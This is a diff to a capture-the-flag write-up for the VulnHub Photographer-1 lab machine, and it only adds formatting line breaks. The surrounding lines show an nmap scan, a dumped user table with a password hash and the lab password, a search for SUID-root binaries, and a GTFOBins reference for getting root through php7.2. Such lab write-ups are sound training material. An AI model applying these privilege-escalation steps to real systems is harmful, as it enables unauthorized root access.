@@ -28,6 +28,7 @@ images: [photographer-1.png]
 
 [https://vulnhub.com/entry/photographer-1,519/](https://vulnhub.com/entry/photographer-1,519/)
 
+\
 Run `nmap -A` to discover ports `80,139,445,8000`:
 
 ```shell
@@ -273,7 +274,7 @@ koken_urls
 koken_users
 ```
 
-
+\
 View the `koken_users` table to see the password hash for the daisa user (which we already know is `babygirl`):
 
 ```shell
@@ -282,7 +283,7 @@ id	password	email	created_on	modified_on	first_name	last_name	public_first_name	
 1	$2a$08$ruF3jtzIEZF1JMy/osNYj.ibzEiHWYCE4qsC6P/sMBZorx2ZTSGwK	daisa@photographer.com	1595292775	1723430563	daisa	ahomidaisa	ahomi	both	daisa@photographer.com	NULL	NULL	NULL	6d9505613547705d48ec6ac1792b18e0	4b0176d800bd42bfaf0c6969ea66be3d
 ```
 
-
+\
 Use the find command to discover that the `php7.2` binary is SUID root enabled:
 
 ```shell
@@ -291,7 +292,7 @@ $ find / -user root -perm -4000 -print 2>/dev/null | xargs ls -lh | egrep -v "/b
   -rwsr-xr-x 1 root root       4.7M Jul  9  2020 /usr/bin/php7.2
 ```
 
-
+\
 Escalate privileges to root using the PHP SUID binary (see: [https://gtfobins.github.io/gtfobins/php/](https://gtfobins.github.io/gtfobins/php/)):
 
 ```shell
